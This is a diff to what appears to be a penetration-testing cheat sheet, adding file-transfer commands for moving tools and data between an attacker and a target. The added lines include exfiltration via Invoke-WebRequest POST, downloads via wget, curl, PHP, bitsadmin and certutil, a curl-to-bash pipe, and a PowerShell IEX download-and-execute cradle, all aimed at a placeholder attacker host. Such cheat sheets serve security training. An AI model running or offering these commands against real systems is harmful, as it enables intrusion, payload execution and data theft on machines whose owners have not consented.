@@ -749,19 +749,32 @@ $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 $ nc -nlvp 443 < file.txt
 $ python -m SimpleHTTPServer 80
 $ python3 -m http.server 8000
+C:\> scp C:\Temp\exploit.exe <user>@<IP address>:/tmp/exploit.exe
 $ smbserver.py a /usr/share/windows-binaries/
+C:\> Invoke-WebRequest -Uri http://<IP address>:443 -Method POST -Body $b64
 ```
 
 - Download Files
 
 ```
 $ nc -nv <IP address> 443 > file.txt
-$ wget http://<IP address>:8000/exploit.sh
+$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
 $ curl http://<IP address>:8000/exploit.sh -o exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
-$ scp exploit.sh <user>@<IP address>:/tmp/exploit.sh
+$ scp <user>@<IP address>:/tmp/exploit.exe C:\Temp\exploit.exe
+$ php -r '$file = file_get_contents("http://<IP address>:8000/exploit.sh"); file_put_contents("exploit.sh",$file);'
 C:\> copy \\<IP address>\a\whoami.exe C:\Windows\Temp\whoami.exe
 C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Offsec\Desktop\new-exploit.exe')"
+C:\> Invoke-WebRequest http://<IP address>/exploit.exe -OutFile exploit.exe
+C:\> Invoke-WebRequest http://<IP address>/exploit.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "exploit.exe"
+C:\> bitsadmin /transfer n http://<IP address>/exploit.exe C:\Temp\exploit.exe
+C:\> certutil.exe -verifyctl -split -f http://<IP address>/exploit.exe
+```
+
+- Download & Execute Cradle
+
+```
+C:\> IEX (New-Object Net.WebClient).DownloadString('http://<IP address>/exploit.exe')
 ```
 
 #8. - Restricted Shell Escapes
